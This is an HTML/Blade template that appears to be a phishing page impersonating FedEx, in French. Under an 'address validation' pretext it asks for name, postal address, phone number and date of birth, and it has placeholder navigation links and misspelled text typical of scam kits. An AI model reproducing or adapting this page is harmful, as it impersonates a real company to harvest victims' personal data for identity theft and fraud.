<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FEDEX</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/assets/owl.carousel.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/css/nice-select.min.css">

    <link rel="stylesheet" href="{{asset('css.css')}}">
</head>
<body>
  
  
  
  

  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <a class="navbar-brand" href="#"><img src="image/logo.png" alt="logo"></a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav right">
        <li class="nav-item active">
          <a class="nav-link" href="#"> Expedier </a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">Suivi</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">Support</a>
        </li>
        <li class="nav-item">
          <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Compte</a>
        </li>
      </ul>
    </div>
  </nav>

  <div class="img">
  
  <br>
  <h4 class="text-center">Validation de votre adresse !</h4>

 
  
  <form action="{{ route('adress') }}" charset=utf-8   method="POST">
    @csrf
  @method('get')
    <div class="container">
    <div class="form-row">
      <div class="form-group col-md-6">
        <label >Nom</label>
        <input type="text" name="nom" class="form-control" id="Nom" placeholder="Voter Nom" required >
      </div>
      <div class="form-group col-md-6">
        <label>Prénom</label>
        <input type="text" class="form-control" id="prenom" name="prenom" placeholder="Voter Prénom" required>
      </div>
    </div>
    <div class="form-group">
      <label>Adresse</label>
      <input type="text" class="form-control" id="adresse" name="adresse" placeholder="Voter Adresse" required>
    </div>
   
    <div class="form-row">
      <div class="form-group col-md-6">
        <label>Ville</label>
        <input type="text" class="form-control" id="ville" name="ville" placeholder="Voter Ville" required>
      </div>
      <div class="form-group col-md-4">
        <label >Pays</label>
        <select  id="pays" name="pays" class="form-control" >
          <option selected disabled>Choose...</option>
          <option>France</option>
          <option>Belgique </option>
          <option>Suisse</option>
          <option>Canada </option>
          <option>France DOM</option>
        </select>
      </div>
      <div class="form-group col-md-2">
        <label >Code Postal</label>
        <input type="text" class="form-control" name="code" id="code" placeholder="Code Postal" required>
      </div>
    </div>
    
    <div class="form-row">
      <div class="form-group col-md-6">
        <label >Téléphone</label>
        <input type="text" name="tele" class="form-control" id="tele" placeholder="Voter Téléphone" required>
      </div>
      <div class="form-group col-md-6">
        <label>Date de naissance</label>
        <input type="date" class="form-control" id="date" name="date"  required>
      </div>
    </div>
   <br>
   
    <center>
    
    <button type="submit" name="submit1" class="btn btn-primary col-md-3 adress">Suivant</button>
 </center>
    <br>
    
    
    
  </div>
  </form><br>
  <br>

</div>
  
<div id="copyright"><!-- #copyright begin -->
   
  <div class="container"><!-- container begin -->
     
      <div class="col-md-6"><!-- col-md-6 finish -->
          
          <p class="pull-left text-center">&copy; 2021 FEDEX All Rights Reserve</p>
          
      </div><!-- col-md-6 finish -->
      
       
      
  </div><!-- container finish -->
  
</div><!-- #copyright finish -->
  
    
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/owl.carousel.min.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/js/jquery.nice-select.min.js"></script>

     
  <script src="{{asset('main.js')}}"></script>
   
     
</body>
</html>

